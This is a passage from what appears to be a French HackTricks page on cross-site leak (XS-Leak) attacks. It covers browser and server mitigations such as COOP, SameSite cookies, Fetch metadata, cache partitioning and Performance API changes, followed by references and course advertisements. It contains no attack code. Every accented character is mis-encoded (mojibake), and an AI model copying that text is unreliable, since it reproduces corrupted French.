* **Pop-ups**. Pour restreindre l'acc√®s √† `window.opener`, l'en-t√™te de r√©ponse HTTP **COOP** d√©finit trois valeurs diff√©rentes : unsafe-none (par d√©faut), same-origin-allow-popups et same-origin. Ces valeurs peuvent √™tre utilis√©es pour **isoler les onglets de navigation et les pop-ups** et ainsi, att√©nuer les techniques de fuite bas√©es sur les pop-ups.
* **Requ√™tes JavaScript**. Les requ√™tes JavaScript cross-origin sont souvent utilis√©es dans les attaques XS-Leak, car un attaquant a un contr√¥le pr√©cis sur la requ√™te √©mise. Cependant, puisque ces requ√™tes ne sont pas activ√©es par CORS, elles sont soumises aux m√™mes restrictions que les requ√™tes envoy√©es par des √©l√©ments HTML, comme des scripts ou des images. Ainsi, l'impact de cette technique de fuite peut √©galement √™tre **att√©nu√© par CORP et CORB**.

M√©thodes plus g√©n√©riques :

* **M√©tadonn√©es Fetch**. Ces en-t√™tes de requ√™te permettent aux propri√©taires de serveurs de mieux comprendre comment le navigateur de l'utilisateur a provoqu√© une requ√™te sp√©cifique. Dans Chrome, les en-t√™tes Sec-Fetch-\* sont automatiquement ajout√©s √† chaque requ√™te et fournissent des m√©tadonn√©es sur la provenance de la requ√™te. Par exemple, Sec-Fetch-Dest: image a √©t√© d√©clench√© √† partir d'un √©l√©ment image. Les applications Web peuvent alors choisir de bloquer les requ√™tes bas√©es sur ces informations.
* **Cookies Same-Site**. Le drapeau de cookie Same-Site permet aux sites Web de d√©clarer **si un cookie doit √™tre restreint √† un contexte same-site ou firstparty**. Tous les principaux navigateurs prennent en charge les cookies Same-Site. Dans GC, les cookies sans l'attribut sont maintenant Lax par d√©faut. Pour les XS-Leaks, **les cookies Same-Site limitent consid√©rablement les possibilit√©s d'attaque de fuite**. D'autre part, les techniques de fuite qui reposent sur **`window.open` fonctionnent toujours avec `SameSite=Lax`**. Les sites Web qui utilisent **d'autres m√©thodes d'authentification**, telles que les certificats c√¥t√© client et l'authentification HTTP, **restent vuln√©rables**.
* **Non-lien des Identifiants Cross-Origin (COIU)**. COIU, √©galement connu sous le nom d'Isolation de Premi√®re Partie (FPI), est une fonctionnalit√© de s√©curit√© optionnelle que les utilisateurs peuvent activer dans les param√®tres experts de FF (about:config) et qui a √©t√© initialement introduite dans Tor Browser. De mani√®re abstraite, c'est un contexte same-site √©tendu. Il **lie plusieurs ressources** (par exemple, Cookies, Cache, stockages c√¥t√© client) **√† la premi√®re partie** au lieu de les partager entre tous les sites Web visit√©s. Si activ√©, COIU diminue consid√©rablement l'applicabilit√© des XS-Leaks, puisque seules les m√©thodes utilisant des pop-ups sont encore possibles pour r√©pondre √† l'exigence de premi√®re partie de la politique.
* **Protections contre le Suivi**. Apple a mis en ≈ìuvre un m√©canisme de confidentialit√© appel√© **Intelligent Tracking Prevention (ITP)** dans SA qui vise √† lutter contre le suivi cross-site en limitant les capacit√©s des cookies et d'autres API Web. Dans les versions plus r√©centes de SA, ITP bloque tous les cookies tiers par d√©faut sans exception \[74]. Ce blocage emp√™che toutes les fuites qui ne sont pas bas√©es sur des pop-ups. FF a adopt√© une approche similaire avec Enhanced Tracking Prevention (ETP), mais ils ne bloquent que certains cookies tiers appartenant √† des fournisseurs de suivi. Dans le contexte des XS-Leaks, ETP att√©nue uniquement les techniques de fuite qui ciblent ces domaines de suivi.
* **Extensions de Navigateur**. Les utilisateurs conscients de la s√©curit√© peuvent utiliser **des extensions de navigateur pour emp√™cher certaines m√©thodes d'inclusion**.

### Att√©nuations de la Technique de Fuite

* **Gestionnaire d'√âv√©nements**. L'**att√©nuation la plus efficace** de cette technique de fuite serait de **les refuser toutes**, mais cela briserait la majorit√© des applications Web sur Internet. Nous proposons donc de **r√©duire le nombre d'informations n√©cessaires qui peuvent √™tre recueillies au sein des √©v√©nements**. Par exemple, l'√©v√©nement de violation de CSP ne devrait pas contenir l'URL de redirection cible dans le champ blockedURI. Ce comportement est impl√©ment√© dans FF et dans les versions plus r√©centes de GC ‚Äì seul SA reste vuln√©rable.
* **Messages d'Erreur**. Pour att√©nuer les XS-Leaks bas√©s sur les messages d'erreur, il y a deux exigences majeures. Premi√®rement, **les messages d'erreur ne doivent pas contenir d'informations d√©taill√©es**, de mani√®re similaire aux messages de gestionnaire d'√©v√©nements. Deuxi√®mement, les navigateurs doivent **minimiser les occurrences de messages d'erreur**. Des XS-Leaks tels que SRI Error, ContentDocument XFO, ou Fetch Redirect d√©tectent si un message d'erreur est lanc√© ou non.
* **Limites Globales**. Corriger les techniques de fuite qui abusent des limites globales est relativement complexe car elles reposent sur des restrictions physiques. La recommandation g√©n√©rale est donc de **restreindre les limites globales sur une petite base par site**. Si la limite globale est de 1, comme pour l'API de paiement, l'attaquant peut tenter d'activer silencieusement l'interface utilisateur WebPayment √† tout moment, ce qui ne r√©ussit que si l'interface n'est pas utilis√©e simultan√©ment par un autre onglet. Nous recommandons d'acc√©der √† l'API de paiement uniquement lorsqu'un √©v√©nement digne de confiance a √©t√© utilis√©. Ainsi, la limite globale est fix√©e √† z√©ro √† moins que l'utilisateur ne donne son consentement, comme un clic gauche de la souris sur une fen√™tre de dialogue, ce qui fixe la limite globale √† un.
* **√âtat Global**. Aucune **propri√©t√© de l'√©tat global d'un navigateur ne doit √™tre accessible**. Par exemple, FF est le seul navigateur qui met √† jour l'√©tat global de l'historique lorsqu'une redirection se produit, ce qui r√©sulte en la lecture de history.length. Les navigateurs devraient cr√©er une nouvelle propri√©t√© d'historique lorsqu'une redirection se produit au lieu de la stocker globalement. D'autres exemples sont les ressources partag√©es, telles que les caches. Les fuites de cache abusent du cache partag√© utilis√© pour tous les sites Web ouverts dans un navigateur. Pour att√©nuer compl√®tement les techniques de fuite de cache, le cache HTTP doit √™tre partitionn√© sur une base par site, comme impl√©ment√© par SA, GC et FF. Notez que dans SA, les iframes ne sont pas affect√©es par la partition du cache.
* **API de Performance**. Nous avons prouv√© que l'API de Performance est une excellente technique de fuite. Dans de nombreux XS-Leaks, nous avons pu d√©tecter la diff√©rence si une r√©ponse de requ√™te cross-origin a ou n'a pas une entr√©e de performance. Comme unification, nous recommandons de s'assurer que toutes les requ√™tes doivent cr√©er une telle entr√©e et que seul le sous-ensemble correct d'informations de timing est enregistr√© pour les requ√™tes cross-origin.

## R√©f√©rences

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** facilement, aliment√©s par les outils communautaires **les plus avanc√©s**.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
